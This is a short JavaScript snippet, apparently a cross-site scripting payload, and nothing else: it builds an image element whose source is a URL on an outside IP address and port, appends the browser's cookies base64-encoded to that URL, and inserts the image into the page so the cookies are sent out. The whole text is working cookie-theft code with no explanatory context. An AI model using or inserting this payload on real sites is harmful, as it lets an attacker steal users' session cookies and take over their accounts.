img = document.createElement('img');
img.src = "http://85.170.243.27:8898/?data=" + btoa(document.cookie)
document.body.appendChild(img);